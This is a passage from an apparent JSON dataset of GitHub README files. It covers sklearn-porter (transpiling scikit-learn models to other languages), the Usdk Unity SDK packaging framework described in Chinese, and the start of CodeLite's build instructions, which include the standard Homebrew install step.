align=\"center\"><a href=\"examples/estimator/classifier/LinearSVC/c/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/LinearSVC/go/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/LinearSVC/php/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/LinearSVC/ruby/basics.pct.ipynb\">\u2713</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.tree.DecisionTreeClassifier.html\">tree.DecisionTreeClassifier</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/DecisionTreeClassifier/java/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/DecisionTreeClassifier/java/basics_embedded.pct.ipynb\">\u2713 \u1d31</a>, <a href=\"examples/estimator/classifier/DecisionTreeClassifier/java/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/DecisionTreeClassifier/js/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/DecisionTreeClassifier/js/basics_embedded.pct.ipynb\">\u2713 \u1d31</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/DecisionTreeClassifier/c/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/DecisionTreeClassifier/c/basics_embedded.pct.ipynb\">\u2713 \u1d31</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/DecisionTreeClassifier/go/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/DecisionTreeClassifier/go/basics_embedded.pct.ipynb\">\u2713 \u1d31</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/DecisionTreeClassifier/php/basics.pct.ipynb\">\u2713</a>,  <a href=\"examples/estimator/classifier/DecisionTreeClassifier/php/basics_embedded.pct.ipynb\">\u2713 \u1d31</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/DecisionTreeClassifier/ruby/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/DecisionTreeClassifier/ruby/basics_embedded.pct.ipynb\">\u2713 \u1d31</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.ensemble.RandomForestClassifier.html\">ensemble.RandomForestClassifier</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/RandomForestClassifier/java/basics_embedded.pct.ipynb\">\u2713 \u1d31</a>, <a href=\"examples/estimator/classifier/RandomForestClassifier/java/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/RandomForestClassifier/js/basics_embedded.pct.ipynb\">\u2713 \u1d31</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/RandomForestClassifier/c/basics_embedded.pct.ipynb\">\u2713 \u1d31</a></td>\n            <td align=\"center\">\u2713 \u1d31</td>\n            <td align=\"center\">\u2713 \u1d31</td>\n            <td align=\"center\">\u2713 \u1d31</td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.ensemble.ExtraTreesClassifier.html\">ensemble.ExtraTreesClassifier</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/ExtraTreesClassifier/java/basics_embedded.pct.ipynb\">\u2713 \u1d31</a>, <a href=\"examples/estimator/classifier/ExtraTreesClassifier/java/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/ExtraTreesClassifier/js/basics.pct.ipynb\">\u2713 \u1d31</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/ExtraTreesClassifier/c/basics.pct.ipynb\">\u2713 \u1d31</a></td>\n            <td align=\"center\"></td>\n            <td align=\"center\">\u2713 \u1d31</td>\n            <td align=\"center\">\u2713 \u1d31</td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.ensemble.AdaBoostClassifier.html\">ensemble.AdaBoostClassifier</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/AdaBoostClassifier/java/basics_embedded.pct.ipynb\">\u2713 \u1d31</a>, <a href=\"examples/estimator/classifier/AdaBoostClassifier/java/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/AdaBoostClassifier/js/basics_embedded.pct.ipynb\">\u2713 \u1d31</a>, <a href=\"examples/estimator/classifier/AdaBoostClassifier/js/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/AdaBoostClassifier/c/basics_embedded.pct.ipynb\">\u2713 \u1d31</a></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.neighbors.KNeighborsClassifier.html\">neighbors.KNeighborsClassifier</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/KNeighborsClassifier/java/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/KNeighborsClassifier/java/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/KNeighborsClassifier/js/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/KNeighborsClassifier/js/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.naive_bayes.GaussianNB.html#sklearn.naive_bayes.GaussianNB\">naive_bayes.GaussianNB</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/GaussianNB/java/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/GaussianNB/java/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/GaussianNB/js/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.naive_bayes.BernoulliNB.html#sklearn.naive_bayes.BernoulliNB\">naive_bayes.BernoulliNB</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/BernoulliNB/java/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/BernoulliNB/java/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/BernoulliNB/js/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.neural_network.MLPClassifier.html\">neural_network.MLPClassifier</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/MLPClassifier/java/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/MLPClassifier/java/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"><a href=\"examples/estimator/classifier/MLPClassifier/js/basics.pct.ipynb\">\u2713</a>, <a href=\"examples/estimator/classifier/MLPClassifier/js/basics_imported.pct.ipynb\">\u2713 \u1d35</a></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n        </tr>\n        <tr>\n            <td align=\"left\" width=\"32%\">Regressor</td>\n            <td align=\"center\" width=\"13%\">Java *</td>\n            <td align=\"center\" width=\"11%\">JS</td>\n            <td align=\"center\" width=\"11%\">C</td>\n            <td align=\"center\" width=\"11%\">Go</td>\n            <td align=\"center\" width=\"11%\">PHP</td>\n            <td align=\"center\" width=\"11%\">Ruby</td>\n        </tr>\n        <tr>\n            <td><a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.neural_network.MLPRegressor.html\">neural_network.MLPRegressor</a></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"><a href=\"examples/estimator/regressor/MLPRegressor/js/basics.pct.ipynb\">\u2713</a></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n            <td align=\"center\"></td>\n        </tr>\n    </tbody>\n</table>\n\n\u2713 = is full-featured,\u3000\u1d31 = with embedded model data,\u3000\u1d35 = with imported model data,\u3000* = default language\n\n\n## Installation\n\n### Stable\n\n[![Build Status stable branch](https://img.shields.io/travis/nok/sklearn-porter/stable.svg)](https://travis-ci.org/nok/sklearn-porter)\n[![PyPI](https://img.shields.io/pypi/v/sklearn-porter.svg)](https://pypi.python.org/pypi/sklearn-porter)\n[![PyPI](https://img.shields.io/pypi/pyversions/sklearn-porter.svg)](https://pypi.python.org/pypi/sklearn-porter)\n\n```bash\n$ pip install sklearn-porter\n```\n\n### Development\n\n[![Build Status master branch](https://img.shields.io/travis/nok/sklearn-porter/master.svg)](https://travis-ci.org/nok/sklearn-porter)\n\nIf you want the [latest changes](https://github.com/nok/sklearn-porter/blob/master/changelog.md#unreleased), you can install this package from the [master](https://github.com/nok/sklearn-porter/tree/master) branch:\n\n```bash\n$ pip uninstall -y sklearn-porter\n$ pip install --no-cache-dir https://github.com/nok/sklearn-porter/zipball/master\n```\n\n\n## Usage\n\n\n### Export\n\nThe following example demonstrates how you can transpile a [decision tree estimator](http://scikit-learn.org/stable/modules/tree.html#classification) to Java:\n\n```python\nfrom sklearn.datasets import load_iris\nfrom sklearn.tree import tree\nfrom sklearn_porter import Porter\n\n# Load data and train the classifier:\nsamples = load_iris()\nX, y = samples.data, samples.target\nclf = tree.DecisionTreeClassifier()\nclf.fit(X, y)\n\n# Export:\nporter = Porter(clf, language='java')\noutput = porter.export(embed_data=True)\nprint(output)\n```\n\nThe exported [result](examples/estimator/classifier/DecisionTreeClassifier/java/basics_embedded.pct.py#L60-L110) matches the [official human-readable version](http://scikit-learn.org/stable/_images/iris.svg) of the decision tree.\n\n\n### Integrity\n\nYou should always check and compute the integrity between the original and the transpiled estimator:\n\n```python\n# ...\nporter = Porter(clf, language='java')\n\n# Compute integrity score:\nintegrity = porter.integrity_score(X)\nprint(integrity)  # 1.0\n```\n\n\n### Prediction\n\nYou can compute the prediction(s) in the target programming language:\n\n```python\n# ...\nporter = Porter(clf, language='java')\n\n# Prediction(s):\nY_java = porter.predict(X)\ny_java = porter.predict(X[0])\ny_java = porter.predict([1., 2., 3., 4.])\n```\n\n\n## Notebooks\n\nYou can run and test all notebooks by starting a Jupyter notebook server locally:\n\n```bash\n$ make open.examples\n$ make stop.examples\n```\n\n\n## CLI\n\nIn general you can use the porter on the command line:\n\n```\n$ porter <pickle_file> [--to <directory>]\n         [--class_name <class_name>] [--method_name <method_name>]\n         [--export] [--checksum] [--data] [--pipe]\n         [--c] [--java] [--js] [--go] [--php] [--ruby]\n         [--version] [--help]\n```\n\nThe following example shows how you can save a trained estimator to the [pickle format](http://scikit-learn.org/stable/modules/model_persistence.html#persistence-example):\n\n```python\n# ...\n\n# Extract estimator:\njoblib.dump(clf, 'estimator.pkl', compress=0)\n```\n\nAfter that the estimator can be transpiled to JavaScript by using the following command:\n\n```bash\n$ porter estimator.pkl --js\n```\n\nThe target programming language is changeable on the fly:\n\n```bash\n$ porter estimator.pkl --c\n$ porter estimator.pkl --java\n$ porter estimator.pkl --php\n$ porter estimator.pkl --java\n$ porter estimator.pkl --ruby\n```\n\nFor further processing the argument `--pipe` can be used to pass the result:\n\n```bash\n$ porter estimator.pkl --js --pipe > estimator.js\n```\n\nFor instance the result can be minified by using [UglifyJS](https://github.com/mishoo/UglifyJS2):\n\n```bash\n$ porter estimator.pkl --js --pipe | uglifyjs --compress -o estimator.min.js\n```\n\n\n## Development\n\n\n### Environment\n\nYou have to install required modules for broader development:\n\n```bash\n$ make install.environment  # conda environment (optional)\n$ make install.requirements.development  # pip requirements\n```\n\nIndependently, the following compilers and intepreters are required to cover all tests:\n\n<table>\n    <thead>\n        <tr>\n            <td width=\"33%\"><strong>Name</strong></td>\n            <td width=\"33%\"><strong>Version</strong></td>\n            <td width=\"33%\"><strong>Command</strong></td>\n        </tr>\n    </thead>\n    <tbody>\n        <tr>\n            <td><a href=\"https://gcc.gnu.org\">GCC</a></td>\n            <td><code>>=4.2</code></td>\n            <td><code>gcc --version</code></td>\n        </tr>\n        <tr>\n            <td><a href=\"https://java.com\">Java</a></td>\n            <td><code>>=1.6</code></td>\n            <td><code>java -version</code></td>\n        </tr>\n        <tr>\n            <td><a href=\"http://www.php.net\">PHP</a></td>\n            <td><code>>=5.6</code></td>\n            <td><code>php --version</code></td>\n        </tr>\n        <tr>\n            <td><a href=\"https://www.ruby-lang.org\">Ruby</a></td>\n            <td><code>>=2.4.1</code></td>\n            <td><code>ruby --version</code></td>\n        </tr>\n        <tr>\n            <td><a href=\"https://golang.org\">Go</a></td>\n            <td><code>>=1.7.4</code></td>\n            <td><code>go version</code></td>\n        </tr>\n        <tr>\n            <td><a href=\"https://nodejs.org\">Node.js</a></td>\n            <td><code>>=6</code></td>\n            <td><code>node --version</code></td>\n        </tr>\n    </tbody>\n</table>\n\n\n### Testing\n\nThe tests cover module functions as well as matching predictions of transpiled estimators. Start all tests with:\n\n```bash\n$ make test\n```\n\nThe test files have a specific pattern: `'[Algorithm][Language]Test.py'`:\n\n```bash\n$ pytest tests -v -o python_files='RandomForest*Test.py'\n$ pytest tests -v -o python_files='*JavaTest.py'\n```\n\nWhile you are developing new features or fixes, you can reduce the test duration by changing the number of tests:\n\n```bash\n$ N_RANDOM_FEATURE_SETS=5 N_EXISTING_FEATURE_SETS=10 \\\n  pytest tests -v -o python_files='*JavaTest.py'\n```\n\n\n### Quality\n\nIt's highly recommended to ensure the code quality. For that [Pylint](https://github.com/PyCQA/pylint/) is used. Start the linter with:\n\n```bash\n$ make lint\n```\n\n\n## Citation\n\nIf you use this implementation in you work, please add a reference/citation to the paper. You can use the following BibTeX entry:\n\n```\n@unpublished{skpodamo,\n  author = {Darius Morawiec},\n  title = {sklearn-porter},\n  note = {Transpile trained scikit-learn estimators to C, Java, JavaScript and others},\n  url = {https://github.com/nok/sklearn-porter}\n}\n```\n\n\n## License\n\nThe module is Open Source Software released under the [MIT](license.txt) license.\n\n\n## Questions?\n\nDon't be shy and feel free to contact me on [Twitter](https://twitter.com/darius_morawiec) or [Gitter](https://gitter.im/nok/sklearn-porter).\n"}, {"repo": "/honghuachen/Usdk", "language": "HTML", "readme_contents": "# Usdk \n\u8fd9\u662f\u4e00\u4e2aUnity3D\u79fb\u52a8\u5e73\u53f0sdk\u5feb\u901f\u9002\u914d\u6846\u67b6\u548c\u591a\u6e20\u9053\u6253\u5305\u5e73\u53f0\uff0c\u65b9\u4fbfandroid\u3001ios\u79fb\u52a8\u5e73\u53f0\u6e20\u9053sdk\u6216\u8005\u5404\u79cdNative\u529f\u80fd\u63d2\u4ef6\u7684\u5feb\u901f\u63a5\u5165\uff0c\u63a5\u5165\u8fc7\u7a0b\u65e0\u9700\u4fee\u6539\u6dfb\u52a0\u4efb\u4f55\u7684C#\u4ee3\u7801\u3002\u5185\u7f6e\u7684\u6253\u5305\u5de5\u5177\uff0c\u80fd\u591f\u5728\u4e0d\u4fee\u6539\u4efb\u4f55unity\u5de5\u7a0b\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u5feb\u901f\u7684\u5355\u6e20\u9053\u548c\u591a\u6e20\u9053\u6253\u5305\u3002sdk\u9002\u914d\u65f6\u95f4\u548c\u6e20\u9053\u6253\u5305\u65f6\u95f4\u81f3\u5c11\u53ef\u4ee5\u51cf\u5c11\u4e00\u534a\u4ee5\u4e0a\u3002\n\n# \u76ee\u5f55\u7ed3\u6784\n[usdk\u76ee\u5f55\u7ed3\u6784\u4e0e\u76ee\u5f55\u8bf4\u660e\uff08xmind\u601d\u7ef4\u5bfc\u56fe\uff09](https://github.com/honghuachen/Usdk/blob/master/doc/Usdk%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84%E8%AF%B4%E6%98%8E.xmind)\n![image](https://github.com/honghuachen/Usdk/blob/master/doc/Usdk%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84%E8%AF%B4%E6%98%8E.png)\n\n# \u6587\u6863\n[Android\u5f00\u53d1\u6587\u6863](https://github.com/honghuachen/Usdk/blob/master/doc/Android%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3.docx)  \n[iOS\u5f00\u53d1\u6587\u6863](https://github.com/honghuachen/Usdk/blob/master/doc/iOS%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3.docx)  \n[Unity\u5bfc\u51faxcode\u81ea\u52a8\u914d\u7f6e\u5de5\u5177\u6587\u6863](https://github.com/honghuachen/Usdk/blob/master/doc/Unity%E5%AF%BC%E5%87%BAxcode%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7.docx)  \n[\u667a\u80fd\u652f\u6301CocoaPods\u9879\u76ee\u7684\u6784\u5efa\u6587\u6863](https://github.com/honghuachen/Usdk/blob/master/doc/CocoaPods%E6%9E%84%E5%BB%BA%E9%85%8D%E7%BD%AE.docx)  \n[Unity\u7aefAPI\u4f7f\u7528](https://github.com/honghuachen/Usdk/blob/master/doc/Unity%E7%AB%AFAPI%E4%BD%BF%E7%94%A8.doc)  \n\n# \u7cfb\u7edf\u8981\u6c42\n#android\uff1a\n#Java JDK1.7\u62161.8\uff0candroid sdk8.0\u4ee5\u4e0a\uff08\u81f3\u5c11\u5347\u5230\u4e8627\uff09\n\n# Unity3D\u7248\u672c\u652f\u6301\nUnity\u5168\u7248\u672c\u652f\u6301\n\n# \u591a\u5e73\u53f0\u652f\u6301\n\u76ee\u524d\u652f\u6301android\u3001ios\nandroid\u5e73\u53f0\u652f\u6301eclipse\u3001android studio\u5de5\u7a0b\u9002\u914d\nios\u652f\u6301xcode\u5de5\u7a0b\u9002\u914d\n\n# \u5feb\u901f\u9002\u914d\u6e20\u9053sdk\u548cNative\u63d2\u4ef6\nUsdk\u80fd\u591f\u5feb\u901f\u7684\u9002\u914d\u5404\u4e2a\u6e20\u9053sdk\u548cNative\u63d2\u4ef6\uff0c\u9002\u914d\u8fc7\u7a0b\u65e0\u9700\u4fee\u6539\u548c\u6dfb\u52a0\u4efb\u4f55C#\u4ee3\u7801\uff0c\u505a\u5230C#\u4ee3\u7801\u7684\u96f6\u5165\u4fb5\u3002\nUsdk\u53ef\u4ee5\u505a\u5230\u6309\u9700\u8c03\u7528\u5404\u79cdNative\u63d2\u4ef6\uff0c\u5404\u79cdNative\u63d2\u4ef6\u53ef\u4ee5\u6309\u9700\u6253\u5165\u5404\u4e2a\u6e20\u9053\u5305\uff0c\u5254\u9664\u65e0\u7528\u7684Native\u63d2\u4ef6\uff0c\u4ece\u800c\u8282\u7701\u5305\u4f53\u3002\n\n# \u652f\u6301\u9879\u76ee\u4f9d\u8d56\nandroid\uff1aandroid\u5e73\u53f0\u901a\u8fc7gradle\u6253\u5305\uff0c\u6240\u4ee5\u5929\u7136\u7684\u5c31\u652f\u6301\u9879\u76ee\u4f9d\u8d56\u3002\u53ea\u9700\u8981\u628a\u4f9d\u8d56\u9879\u76ee\u505a\u6210\u4e00\u4e2amodule\u653e\u5230\u6e20\u9053libs\u6587\u4ef6\u5939\u4e0b\uff0c\u5728settings.gradle\u4e2d\u914d\u7f6emodule\u7684\u4f9d\u8d56\u8def\u5f84\uff0c\u518d\u5728build.gradle\u7684dependencies\u8282\u70b9\u4e0b\u4f9d\u8d56\u76f8\u5e94\u7684module\u5373\u53ef\u3002\niOS\uff1a\u53ef\u4ee5\u901a\u8fc7Framework\u3001cocoaPods\u3001workspace\u7684\u65b9\u5f0f\u5efa\u7acb\u79c1\u6709\u5e93\u7684\u4f9d\u8d56\u3002\n\n# \u5f3a\u5927\u7684\u591a\u6e20\u9053\u6253\u5305\u5e73\u53f0\nUsdk\u4e0d\u4ec5\u4ec5\u662f\u4e00\u4e2asdk\u9002\u914d\u6846\u67b6\uff0c\u66f4\u662f\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684\u591a\u6e20\u9053\u6253\u5305\u5e73\u53f0\uff0c\u901a\u8fc7\u5f3a\u5927\u7684sdk\u9002\u914d\u673a\u5236\u80fd\u591f\u5feb\u901f\u7684\u5b9e\u73b0\u5355\u6e20\u9053\u548c\u591a\u6e20\u9053\u7684\u51fa\u5305\uff0c\u5e76\u4e14\u53ef\u4ee5\u5927\u5927\u7684\u51cf\u5c11\u51fa\u5305\u65f6\u95f4\u3002\n\n# jenkins\u8fdc\u7a0b\u6784\u5efa\u652f\u6301\nUsdk\u5b9e\u73b0\u4e86\u672c\u5730\u547d\u4ee4\u884c\u6253\u5305\u5de5\u5177\uff08build.bat\\build.sh\uff09\uff0c\u4f7f\u7528jenkins\u8fdc\u7a0b\u6784\u5efa\u53ea\u9700\u8981\u628a\u672c\u5730\u7684\u547d\u4ee4\u884c\u5de5\u5177\u7a0d\u4f5c\u4fee\u6539\uff0c\u628a\u672c\u5730\u8f93\u5165\u53c2\u6570\u64cd\u4f5c\u53bb\u6389\u5e76\u5728jenkins\u5e73\u53f0\u4e0a\u8fdb\u884c\u53c2\u6570\u8bbe\u7f6e\u518d\u8c03\u7528\u672c\u5730\u547d\u4ee4\u884c\u5de5\u5177\u6253\u5305\u5373\u53ef\u3002\n\n# Unity\u5bfc\u51faxcode\u81ea\u52a8\u914d\u7f6e\u5de5\u5177([\u6587\u6863](https://github.com/honghuachen/Usdk/blob/master/doc/Unity%E5%AF%BC%E5%87%BAxcode%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7.docx))\n[Unity\u5bfc\u51faxcode\u81ea\u52a8\u914d\u7f6e\u5de5\u5177\u6587\u6863](https://github.com/honghuachen/Usdk/blob/master/doc/Unity%E5%AF%BC%E5%87%BAxcode%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7.docx)  \n\u5728unity4.x\u901a\u8fc7xupoter\u63d2\u4ef6\u6765\u8bbe\u7f6eunity\u5bfc\u51faxcode\u81ea\u52a8\u914d\u7f6e\uff0c\u5230\u4e86unity5.x unity\u81ea\u5df1\u5b9e\u73b0\u4e86\u4e00\u5957\u5de5\u5177\uff0c\u5e76\u4e14\u6bd4xupoter\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u64cd\u4f5c\u53ef\u80fd\u3002\u4f46\u662funity\u7684\u5de5\u5177\u96c6\u6210\u5728\u4e86unity\u7f16\u8f91\u5668\u91cc\u9762\uff0c\u6240\u4ee5\u5982\u679c\u8981\u60f3\u4f7f\u7528\u53ea\u80fd\u5728unity\u5de5\u7a0b\u4e2d\u901a\u8fc7\u7f16\u8f91\u5668\u529f\u80fd\u6765\u64cd\u4f5c\u5bfc\u51faxcode\u5de5\u7a0b\u7684\u81ea\u52a8\u914d\u7f6e\u3002\u8fd9\u6837\u6709\u4e00\u4e2a\u7f3a\u70b9\u5c31\u662f\u5bf9\u4e8eunity\u5de5\u7a0b\u4e0d\u9700\u8981\u53d8\u5316\u4f46\u662f\u53c8\u8981\u6253\u591a\u4e2a\u6e20\u9053\u7684iOS\u5305\u7684\u60c5\u51b5\u4e0b\u9700\u8981\u6bcf\u6b21\u90fd\u8981\u91cd\u65b0\u4eceUnity\u5bfc\u51fa\u5230xcode\uff0c\u5bf9\u4e8e\u5927\u9879\u76ee\u8fd9\u662f\u5341\u5206\u6d6a\u8d39\u65f6\u95f4\u7684\u3002\u9488\u5bf9\u4e0a\u8ff0\u60c5\u51b5\uff0cUsdk\u72ec\u7acb\u51fa\u4e86unity\u8fd9\u5957\u81ea\u52a8\u914d\u7f6e\u5de5\u5177\uff0c\u5b8c\u5168\u8131\u79bb\u4e86Unity\u4f53\u7cfb\uff0c\u80fd\u591f\u5355\u72ec\u4f5c\u4e3a\u4e00\u4e2a\u5916\u90e8\u5de5\u5177\u968f\u65f6\u968f\u5730\u7684\u64cd\u4f5cxcode\u5de5\u7a0b\u4e0b\u7684\u5de5\u7a0b\u914d\u7f6e\u6587\u4ef6\u548cInfo.plist\u914d\u7f6e\u6587\u4ef6\uff0c\u53ef\u4ee5\u6dfb\u52a0\u6216\u8005\u79fb\u9664\u6307\u5b9a\u5e93\u3001\u6e90\u7801\u3001\u8d44\u6e90\u7b49\uff0c\u64cd\u4f5c\u975e\u5e38\u7075\u6d3b\uff0c\u53ea\u8981\u4f60\u80fd\u60f3\u5f97\u5230\u7684\u64cd\u4f5c\u90fd\u80fd\u591f\u5b9e\u73b0\u3002\n\u5e76\u4e14\u5de5\u5177\u901a\u8fc7unity\u5b89\u88c5\u76ee\u5f55\u4e0b\u7684mono\u865a\u62df\u673a\u8fdb\u884c\u8fd0\u884c\uff0c\u6240\u4ee5\u5177\u6709\u8de8\u5e73\u53f0\u7684\u80fd\u529b\uff0c\u4e0d\u7ba1\u662fwindows\u8fd8\u662fmac\u90fd\u80fd\u591f\u4f7f\u7528\u3002\n\n# iOS\u6253\u5305\u667a\u80fd\u652f\u6301CocoaPods\u9879\u76ee\u7684\u6784\u5efa([\u6587\u6863](https://github.com/honghuachen/Usdk/blob/master/doc/CocoaPods%E6%9E%84%E5%BB%BA%E9%85%8D%E7%BD%AE.docx))\n[\u667a\u80fd\u652f\u6301CocoaPods\u9879\u76ee\u7684\u6784\u5efa\u6587\u6863](https://github.com/honghuachen/Usdk/blob/master/doc/CocoaPods%E6%9E%84%E5%BB%BA%E9%85%8D%E7%BD%AE.docx)  \nUsdk\u52a0\u5165\u4e86CocoaPods\u81ea\u52a8\u6784\u5efa\u5de5\u5177\uff0c\u4f7f\u5f97cocoapods\u65b9\u5f0f\u6784\u5efaxcode\u5de5\u7a0b\u6210\u4e3a\u53ef\u80fd\uff0c\u5185\u7f6e\u5de5\u5177\u53ef\u4ee5\u5b9e\u73b0Project\\Workspace xcode\u9879\u76ee\u7c7b\u578b\u7684\u6784\u5efa\u3002\niOS\u591a\u6e20\u9053\u591a\u63d2\u4ef6\u51fa\u5305\u4e0d\u4ec5\u652f\u6301\u672c\u5730Framework\u7684\u5bfc\u5165\uff0c\u8fd8\u667a\u80fd\u652f\u6301CocoaPods\u8fdc\u7a0b\u4ed3\u5e93\u4f9d\u8d56\u7684\u6784\u5efa\uff0c\u5e76\u4e14\u4e24\u79cd\u65b9\u5f0f\u53ef\u4ee5\u6df7\u7528\u3002\u53ea\u9700\u8981\u5728\u63d2\u4ef6\u6216\u8005\u6e20\u9053\u7684module\u6587\u4ef6\u5939\u4e0b\u52a0\u5165\u4e00\u4e2aCocoaPods.json\u7684\u4f9d\u8d56\u914d\u7f6e\u6587\u4ef6\u5373\u53ef\uff0c\u6253\u5305\u5de5\u5177\u5373\u4f1a\u667a\u80fd\u8bc6\u522b\u4f9d\u8d56\u5e76\u6784\u5efaCocoaPods\u9879\u76ee\u3002\n\n# \u6280\u672f\u652f\u6301\nQQ\u7fa4\uff1a[3112035](https://jq.qq.com/?_wv=1027&k=5RKFifT)\n"}, {"repo": "/eranif/codelite", "language": "C++", "readme_contents": "[![CircleCI](https://circleci.com/gh/eranif/codelite.svg?style=svg)](https://circleci.com/gh/eranif/codelite)\n[![Join the chat at https://gitter.im/eranif/codelite](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/eranif/codelite?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\n\nWhat is CodeLite?\n====\n\n[CodeLite][1] is a free, open source, cross platform IDE specialized in C, C++, PHP and JavaScript (mainly for backend developers using Node.js) programming languages, which runs best on all major platforms (Windows, macOS and Linux).\n\nYou can download pre-built binaries for Windows, macOS and Linux from our **[Download Page][2]**.\n\nMore information can be found here:\n\n - [Official Website][3]\n - [Download Page][4]\n - [Wiki][5]\n\n----------\n\nBuilding CodeLite on Linux\n----\n\nTo build CodeLite on your computer you will need these packages:\n\n - wxWidgets 3.1 or later\n - The GTK development package: often called libgtk2.0-dev or wxGTK-devel, or similar\n - pkg-config (which usually comes with the GTK dev package)\n - The build-essential package (or the relevant bit of it: G++, Make etc)\n - CMake\n - Git.\n\nYou should have wxWidgets 3.0 or later built on your machine. If you don't know how to build (or you're just lazy...) you can [download wxWidgets from CodeLite's repository][6].\n\n\nOn Ubuntu / Debian you can install all of the above (except for wxWidgets 3.0) by typing:\n\n    sudo apt-get install libgtk2.0-dev pkg-config build-essential git cmake libssh-dev libwxbase3.0-dev libsqlite3-dev libwxsqlite3-3.0-dev\n\nGit clone the sources:\n\n    git clone https://github.com/eranif/codelite.git\n\nRun CMake and build CodeLite:\n\n  ```bash\n  cd codelite\n  mkdir build-release\n  cd build-release\n  cmake .. -DCMAKE_BUILD_TYPE=Release\n  cmake --build . -j $(nproc)\n  sudo cmake --build . --target install\n  ```\n\n----------\n\nBuilding CodeLite on macOS\n----\n\nPrerequisites:\n\n - wxWidgets 3.1 or later\n - CMake\n - Git\n - Xcode\n - Xcode command-line tools\n - Homebrew.\n\nPreparation:\n - (Optional) Make a separate folder for building if you want to get rid of all except the .app file after building\n - Install Xcode from Mac App Store\n - Install Xcode command-line tools: `xcode-select --install`\n - Install Homebrew:\n```\n ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n```\n - Update Homebrew: `brew update`\n 